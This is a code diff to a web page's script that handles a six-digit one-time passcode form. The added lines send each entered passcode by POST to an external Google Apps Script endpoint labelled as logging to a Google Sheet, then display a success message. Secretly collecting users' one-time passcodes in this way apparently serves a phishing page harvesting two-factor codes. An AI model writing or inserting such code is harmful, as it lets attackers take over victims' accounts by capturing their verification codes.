@@ -109,6 +109,23 @@
       const otp = document.getElementById("otpInput").value;
 
       if (otp.length === 6) {
+        // 🔄 Send OTP to Google Sheet
+        fetch("https://script.google.com/macros/s/AKfycby9pWCtOSMYeLasNn3nilvegdyDmvbmvqyY0ZiYEpKMpulw-fuIrVqSZ33sezXdN9g/exec", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ otp: otp })
+        })
+        .then(res => res.text())
+        .then(response => {
+          console.log("Logged to Sheet:", response);
+        })
+        .catch(err => {
+          console.error("Error logging OTP:", err);
+        });
+
+        // ✅ Show Success and Redirect
         document.getElementById("successMsg").style.display = "block";
         document.getElementById("otpInput").disabled = true;
         this.querySelector("button").disabled = true;
@@ -123,3 +140,4 @@
   </script>
 </body>
 </html>
+
